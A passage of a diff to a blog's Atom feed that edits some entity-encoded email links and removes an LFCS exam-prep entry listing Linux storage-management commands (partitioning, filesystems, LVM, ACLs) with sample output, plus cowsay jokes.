-<li>Alexander B. Keith &ndash; <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x61;&#107;&#101;&#x69;&#x74;&#x68;&#64;&#x69;&#109;&#102;&#x2e;&#108;&#x6f;&#99;&#97;&#108;">&#x61;&#107;&#101;&#105;&#x74;&#x68;&#x40;&#x69;&#x6d;&#102;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;</a></li>
-<li>Elizabeth R. Stone &ndash; <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#x65;&#115;&#116;&#111;&#110;&#101;&#64;&#105;&#x6d;&#102;&#46;&#x6c;&#x6f;&#x63;&#x61;&#108;">&#101;&#x73;&#x74;&#x6f;&#110;&#x65;&#64;&#x69;&#109;&#102;&#x2e;&#108;&#111;&#x63;&#x61;&#x6c;</a></li>
+<li>Roger S. Michaels &ndash; <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#114;&#x6d;&#105;&#99;&#x68;&#97;&#x65;&#108;&#115;&#x40;&#105;&#x6d;&#x66;&#46;&#x6c;&#111;&#99;&#x61;&#x6c;">&#114;&#x6d;&#x69;&#x63;&#x68;&#x61;&#x65;&#x6c;&#x73;&#64;&#x69;&#x6d;&#102;&#x2e;&#x6c;&#111;&#99;&#97;&#x6c;</a></li>
+<li>Alexander B. Keith &ndash; <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x61;&#x6b;&#x65;&#105;&#116;&#x68;&#64;&#105;&#x6d;&#x66;&#x2e;&#108;&#111;&#99;&#97;&#108;">&#97;&#107;&#x65;&#x69;&#x74;&#x68;&#x40;&#105;&#x6d;&#x66;&#x2e;&#108;&#x6f;&#99;&#97;&#108;</a></li>
+<li>Elizabeth R. Stone &ndash; <a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#101;&#115;&#116;&#111;&#110;&#101;&#64;&#105;&#109;&#102;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;">&#101;&#x73;&#x74;&#111;&#110;&#x65;&#64;&#105;&#x6d;&#102;&#46;&#108;&#x6f;&#x63;&#97;&#x6c;</a></li>
 </ul>
 
 
@@ -13143,680 +13719,6 @@ SERPENT, TWOFISH.
 </span><span class='line'>/ Be free and open and breezy! Enjoy!     \
 </span><span class='line'>| Things won't get any better so get used |
 </span><span class='line'>\ to it.                                  /
-</span><span class='line'> -----------------------------------------
-</span><span class='line'>        \   ^__^
-</span><span class='line'>         \  (oo)\_______
-</span><span class='line'>            (__)\       )\/\
-</span><span class='line'>                ||----w |
-</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[LFCS prep - Storage Management]]></title>
-    <link href="http://chousensha.github.io/blog/2018/03/02/lfcs-prep-storage-management/"/>
-    <updated>2018-03-02T20:12:06+02:00</updated>
-    <id>http://chousensha.github.io/blog/2018/03/02/lfcs-prep-storage-management</id>
-    <content type="html"><![CDATA[<p>Various commands for the LFCS Storage Management domain, which at the time of this post can be found at <a href="https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf">https://training.linuxfoundation.org/images/pdfs/LFCS_Domains_Competencies_V2.16.pdf</a></p>
-
-<!-- more -->
-
-
-<p><img class="center" src="http://chousensha.github.io/images/sysadmin/storage.png" title="linux storage" alt="storage objectives"></p>
-
-<p><img class="center" src="http://chousensha.github.io/images/sysadmin/storage2.png" title="linux storage" alt="storage objectives"></p>
-
-<h4>mdadm</h4>
-
-<blockquote><p>manage MD devices aka Linux Software RAID</p></blockquote>
-
-<h4>lsblk</h4>
-
-<blockquote><p>list block devices</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk
-</span><span class='line'>NAME            MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
-</span><span class='line'>fd0               2:0    1    4K  0 disk
-</span><span class='line'>sda               8:0    0   20G  0 disk
-</span><span class='line'>├─sda1            8:1    0  500M  0 part /boot
-</span><span class='line'>└─sda2            8:2    0 19.5G  0 part
-</span><span class='line'>  ├─centos-root 253:0    0 17.5G  0 lvm  /
-</span><span class='line'>  └─centos-swap 253:1    0    2G  0 lvm  [SWAP]
-</span><span class='line'>sdb               8:16   0    1G  0 disk
-</span><span class='line'>sr0              11:0    1 1024M  0 rom  </span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>output filesystem info</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>lsblk -f
-</span><span class='line'>NAME         FSTYPE      LABEL UUID                                   MOUNTPOINT
-</span><span class='line'>fd0                                                                   
-</span><span class='line'>sda                                                                   
-</span><span class='line'>├─sda1       xfs               ef67363c-0fb5-4680-aa53-572e5e38d8d0   /boot
-</span><span class='line'>└─sda2       LVM2_member       0R3HDI-jqHC-WdoO-gDZ5-ScPb-JdkI-y9sIvD
-</span><span class='line'>  ├─centos-root
-</span><span class='line'>             xfs               71dd7ac4-ba5b-4e8a-a706-a51264d85900   /
-</span><span class='line'>  └─centos-swap
-</span><span class='line'>             swap              41edd5da-8142-4fc6-9e96-e8b7a08c2ae9   [SWAP]
-</span><span class='line'>sdb                                                                   
-</span><span class='line'>sr0                                                </span></code></pre></td></tr></table></div></figure>
-
-
-<h4>fdisk</h4>
-
-<blockquote><p>manipulate disk partition table</p></blockquote>
-
-<ul>
-<li>list partition tables</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>fdisk -l /dev/sda
-</span><span class='line'>
-</span><span class='line'>Disk /dev/sda: 21.5 GB, 21474836480 bytes, 41943040 sectors
-</span><span class='line'>Units = sectors of 1 * 512 = 512 bytes
-</span><span class='line'>Sector size (logical/physical): 512 bytes / 512 bytes
-</span><span class='line'>I/O size (minimum/optimal): 512 bytes / 512 bytes
-</span><span class='line'>Disk label type: dos
-</span><span class='line'>Disk identifier: 0x000e124e
-</span><span class='line'>
-</span><span class='line'>   Device Boot      Start         End      Blocks   Id  System
-</span><span class='line'>/dev/sda1   *        2048     1026047      512000   83  Linux
-</span><span class='line'>/dev/sda2         1026048    41943039    20458496   8e  Linux LVM</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>fdisk menu</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>Command action
-</span><span class='line'>   a   toggle a bootable flag
-</span><span class='line'>   b   edit bsd disklabel
-</span><span class='line'>   c   toggle the dos compatibility flag
-</span><span class='line'>   d   delete a partition
-</span><span class='line'>   g   create a new empty GPT partition table
-</span><span class='line'>   G   create an IRIX (SGI) partition table
-</span><span class='line'>   l   list known partition types
-</span><span class='line'>   m   print this menu
-</span><span class='line'>   n   add a new partition
-</span><span class='line'>   o   create a new empty DOS partition table
-</span><span class='line'>   p   print the partition table
-</span><span class='line'>   q   quit without saving changes
-</span><span class='line'>   s   create a new empty Sun disklabel
-</span><span class='line'>   t   change a partition's system id
-</span><span class='line'>   u   change display/entry units
-</span><span class='line'>   v   verify the partition table
-</span><span class='line'>   w   write table to disk and exit
-</span><span class='line'>   x   extra functionality (experts only)</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>gdisk</h4>
-
-<blockquote><p>Interactive GUID partition table (GPT) manipulator</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>gdisk /dev/sdb
-</span><span class='line'>GPT fdisk (gdisk) version 0.8.6
-</span><span class='line'>
-</span><span class='line'>Partition table scan:
-</span><span class='line'>  MBR: not present
-</span><span class='line'>  BSD: not present
-</span><span class='line'>  APM: not present
-</span><span class='line'>  GPT: not present
-</span><span class='line'>
-</span><span class='line'>Creating new GPT entries.
-</span><span class='line'>
-</span><span class='line'>Command (? for help): ?
-</span><span class='line'>b back up GPT data to a file
-</span><span class='line'>c change a partition's name
-</span><span class='line'>d delete a partition
-</span><span class='line'>i show detailed information on a partition
-</span><span class='line'>l list known partition types
-</span><span class='line'>n add a new partition
-</span><span class='line'>o create a new empty GUID partition table (GPT)
-</span><span class='line'>p print the partition table
-</span><span class='line'>q quit without saving changes
-</span><span class='line'>r recovery and transformation options (experts only)
-</span><span class='line'>s sort partitions
-</span><span class='line'>t change a partition's type code
-</span><span class='line'>v verify disk
-</span><span class='line'>w write table to disk and exit
-</span><span class='line'>x extra functionality (experts only)
-</span><span class='line'>? print this menu</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>parted</h4>
-
-<blockquote><p>a partition manipulation program</p></blockquote>
-
-<ul>
-<li>list all partitions</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>parted -l
-</span><span class='line'>Model: VMware, VMware Virtual S (scsi)
-</span><span class='line'>Disk /dev/sda: 21.5GB
-</span><span class='line'>Sector size (logical/physical): 512B/512B
-</span><span class='line'>Partition Table: msdos
-</span><span class='line'>Disk Flags:
-</span><span class='line'>
-</span><span class='line'>Number  Start   End     Size    Type     File system  Flags
-</span><span class='line'> 1      1049kB  525MB   524MB   primary  xfs          boot
-</span><span class='line'> 2      525MB   21.5GB  20.9GB  primary               lvm
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Error: /dev/sdb: unrecognised disk label
-</span><span class='line'>Model: VMware, VMware Virtual S (scsi)                                    
-</span><span class='line'>Disk /dev/sdb: 1074MB
-</span><span class='line'>Sector size (logical/physical): 512B/512B
-</span><span class='line'>Partition Table: unknown
-</span><span class='line'>Disk Flags:
-</span><span class='line'>
-</span><span class='line'>Model: Linux device-mapper (linear) (dm)
-</span><span class='line'>Disk /dev/mapper/centos-swap: 2147MB
-</span><span class='line'>Sector size (logical/physical): 512B/512B
-</span><span class='line'>Partition Table: loop
-</span><span class='line'>Disk Flags:
-</span><span class='line'>
-</span><span class='line'>Number  Start  End     Size    File system     Flags
-</span><span class='line'> 1      0.00B  2147MB  2147MB  linux-swap(v1)
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>Model: Linux device-mapper (linear) (dm)
-</span><span class='line'>Disk /dev/mapper/centos-root: 18.8GB
-</span><span class='line'>Sector size (logical/physical): 512B/512B
-</span><span class='line'>Partition Table: loop
-</span><span class='line'>Disk Flags:
-</span><span class='line'>
-</span><span class='line'>Number  Start  End     Size    File system  Flags
-</span><span class='line'> 1      0.00B  18.8GB  18.8GB  xfs</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>mkfs</h4>
-
-<blockquote><p>build a Linux filesystem</p></blockquote>
-
-<ul>
-<li><p>-t # filesystem type</p></li>
-<li><p>types of filesystems</p></li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mkfs.
-</span><span class='line'>mkfs.btrfs   mkfs.ext2    mkfs.ext4    mkfs.minix   mkfs.vfat    
-</span><span class='line'>mkfs.cramfs  mkfs.ext3    mkfs.fat     mkfs.msdos   mkfs.xfs  </span></code></pre></td></tr></table></div></figure>
-
-
-<h4>tune2fs</h4>
-
-<blockquote><p>adjust  tunable  filesystem  parameters  on  ext2/ext3/ext4 filesystems</p></blockquote>
-
-<ul>
-<li>set label</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>tune2fs -L label device</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>e2label</h4>
-
-<blockquote><p>Change the label on an ext2/ext3/ext4 filesystem</p></blockquote>
-
-<h4>dumpe2fs</h4>
-
-<blockquote><p>dump ext2/ext3/ext4 filesystem information</p></blockquote>
-
-<h4>xfs_db</h4>
-
-<blockquote><p>debug an XFS filesystem</p></blockquote>
-
-<h4>mount</h4>
-
-<blockquote><p>mount a filesystem</p>
-
-<p>mount -t type device dir</p></blockquote>
-
-<ul>
-<li>-a # mount all filesystems</li>
-<li>-r # mount read-only</li>
-<li><p>-o # mount options</p></li>
-<li><p>list all mounted filesystems</p></li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>mount -l
-</span><span class='line'>sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime,seclabel)
-</span><span class='line'>proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
-</span><span class='line'>devtmpfs on /dev type devtmpfs (rw,nosuid,seclabel,size=926484k,nr_inodes=231621,mode=755)
-</span><span class='line'>securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
-</span><span class='line'>tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,seclabel)
-</span><span class='line'>devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,seclabel,gid=5,mode=620,ptmxmode=000)
-</span><span class='line'>tmpfs on /run type tmpfs (rw,nosuid,nodev,seclabel,mode=755)
-</span><span class='line'>tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,seclabel,mode=755)
-</span><span class='line'>cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
-</span><span class='line'>pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
-</span><span class='line'>cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
-</span><span class='line'>cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
-</span><span class='line'>cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
-</span><span class='line'>cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
-</span><span class='line'>cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)
-</span><span class='line'>cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
-</span><span class='line'>cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
-</span><span class='line'>cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
-</span><span class='line'>cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
-</span><span class='line'>cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_prio,net_cls)
-</span><span class='line'>configfs on /sys/kernel/config type configfs (rw,relatime)
-</span><span class='line'>/dev/mapper/rhel-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota)
-</span><span class='line'>selinuxfs on /sys/fs/selinux type selinuxfs (rw,relatime)
-</span><span class='line'>systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=33,pgrp=1,timeout=300,minproto=5,maxproto=5,direct)
-</span><span class='line'>hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,seclabel)
-</span><span class='line'>debugfs on /sys/kernel/debug type debugfs (rw,relatime)
-</span><span class='line'>mqueue on /dev/mqueue type mqueue (rw,relatime,seclabel)
-</span><span class='line'>nfsd on /proc/fs/nfsd type nfsd (rw,relatime)
-</span><span class='line'>/dev/sda1 on /boot type xfs (rw,relatime,seclabel,attr2,inode64,noquota)
-</span><span class='line'>sunrpc on /var/lib/nfs/rpc_pipefs type rpc_pipefs (rw,relatime)
-</span><span class='line'>tmpfs on /run/user/0 type tmpfs (rw,nosuid,nodev,relatime,seclabel,size=188412k,mode=700)
-</span><span class='line'>gvfsd-fuse on /run/user/0/gvfs type fuse.gvfsd-fuse (rw,nosuid,nodev,relatime,user_id=0,group_id=0)
-</span><span class='line'>fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>umount</h4>
-
-<blockquote><p>unmount file systems</p></blockquote>
-
-<h4>blkid</h4>
-
-<blockquote><p>locate/print block device attributes</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>blkid
-</span><span class='line'>/dev/sda1: UUID="b8e2fb99-bf4c-4632-883b-8ed5c2350b1e" TYPE="xfs"
-</span><span class='line'>/dev/sda2: UUID="PLxZXl-aHBf-9VPQ-XOd1-eLMH-cWOW-NhjdcP" TYPE="LVM2_member"
-</span><span class='line'>/dev/mapper/rhel-root: UUID="2c0268ac-c31a-462d-b5b9-41bdfbecd75d" TYPE="xfs"
-</span><span class='line'>/dev/mapper/rhel-swap: UUID="6544d880-b634-4566-a68d-d3a58cec4cf6" TYPE="swap"</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>xfs_info</h4>
-
-<blockquote><p>expand an XFS filesystem</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>xfs_info /dev/sda1
-</span><span class='line'>meta-data=/dev/sda1              isize=512    agcount=4, agsize=65536 blks
-</span><span class='line'>         =                       sectsz=512   attr=2, projid32bit=1
-</span><span class='line'>         =                       crc=1        finobt=0 spinodes=0
-</span><span class='line'>data     =                       bsize=4096   blocks=262144, imaxpct=25
-</span><span class='line'>         =                       sunit=0      swidth=0 blks
-</span><span class='line'>naming   =version 2              bsize=4096   ascii-ci=0 ftype=1
-</span><span class='line'>log      =internal               bsize=4096   blocks=2560, version=2
-</span><span class='line'>         =                       sectsz=512   sunit=0 blks, lazy-count=1
-</span><span class='line'>realtime =none                   extsz=4096   blocks=0, rtextents=0</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>mkswap</h4>
-
-<blockquote><p>set up a Linux swap area</p></blockquote>
-
-<h4>swapon, swapoff</h4>
-
-<blockquote><p>enable/disable devices and files for paging and swapping</p></blockquote>
-
-<ul>
-<li>display swap usage</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>swapon -s
-</span><span class='line'>Filename              Type        Size    Used    Priority
-</span><span class='line'>/dev/dm-1        </span></code></pre></td></tr></table></div></figure>
-
-
-<h4>pvscan</h4>
-
-<blockquote><p>scan all disks for physical volumes</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pvscan
-</span><span class='line'>  PV /dev/sda2   VG centos          lvm2 [19.51 GiB / 40.00 MiB free]
-</span><span class='line'>  Total: 1 [19.51 GiB] / in use: 1 [19.51 GiB] / in no VG: 0 [0   ]</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>vgscan</h4>
-
-<blockquote><p>scan all disks for volume groups and rebuild caches</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>vgscan
-</span><span class='line'>  Reading volume groups from cache.
-</span><span class='line'>  Found volume group "centos" using metadata type lvm2</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>lvscan</h4>
-
-<blockquote><p>scan (all disks) for Logical Volumes</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>lvscan
-</span><span class='line'>  ACTIVE            '/dev/centos/swap' [2.00 GiB] inherit
-</span><span class='line'>  ACTIVE            '/dev/centos/root' [17.47 GiB] inherit</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>pvcreate</h4>
-
-<blockquote><p>initialize a disk or partition for use by LVM</p></blockquote>
-
-<h4>vgcreate</h4>
-
-<blockquote><p>create a volume group</p></blockquote>
-
-<h4>vgs</h4>
-
-<blockquote><p>report information about volume groups</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>vgs
-</span><span class='line'>  VG     #PV #LV #SN Attr   VSize  VFree
-</span><span class='line'>  centos   1   2   0 wz--n- 19.51g 40.00m</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>lvcreate</h4>
-
-<blockquote><p>create a logical volume in an existing volume group</p></blockquote>
-
-<h4>vgextend</h4>
-
-<blockquote><p>add physical volumes to a volume group</p></blockquote>
-
-<h4>lvextend</h4>
-
-<blockquote><p>extend the size of a logical volume</p></blockquote>
-
-<h4>lvremove</h4>
-
-<blockquote><p>remove a logical volume</p></blockquote>
-
-<h4>pvmove</h4>
-
-<blockquote><p>move physical extents</p></blockquote>
-
-<h4>vgreduce</h4>
-
-<blockquote><p>reduce a volume group</p></blockquote>
-
-<h4>pvremove</h4>
-
-<blockquote><p>remove a physical volume</p></blockquote>
-
-<h4>getfacl</h4>
-
-<blockquote><p>get file access control lists</p></blockquote>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>getfacl out.txt
-</span><span class='line'># file: out.txt
-</span><span class='line'># owner: root
-</span><span class='line'># group: root
-</span><span class='line'>user::rw-
-</span><span class='line'>group::r--
-</span><span class='line'>other::r--</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>setfacl</h4>
-
-<blockquote><p>set file access control lists</p></blockquote>
-
-<ul>
-<li>give user dave read and write rights on a file</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>setfacl -m u:dave:rw file</span></code></pre></td></tr></table></div></figure>
-
-
-<ul>
-<li>set default ACL recursively on a directory for a group and give read and directory traversal permissions (but no execute for files)</li>
-</ul>
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>setfacl -R -m d:g:rockstars:rX folder</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>_________________________________________
-</span><span class='line'>/ Q: How many IBM types does it take to   \
-</span><span class='line'>| change a light bulb? A: Fifteen. One to |
-</span><span class='line'>| do it, and fourteen to write document   |
-</span><span class='line'>| number                                  |
-</span><span class='line'>|                                         |
-</span><span class='line'>| GC7500439-0001, Multitasking            |
-</span><span class='line'>| Incandescent Source System Facility,    |
-</span><span class='line'>|                                         |
-</span><span class='line'>| of which 10% of the pages state only    |
-</span><span class='line'>| "This page intentionally                |
-</span><span class='line'>|                                         |
-</span><span class='line'>| left blank", and 20% of the definitions |
-</span><span class='line'>| are of the form "A:.....                |
-</span><span class='line'>|                                         |
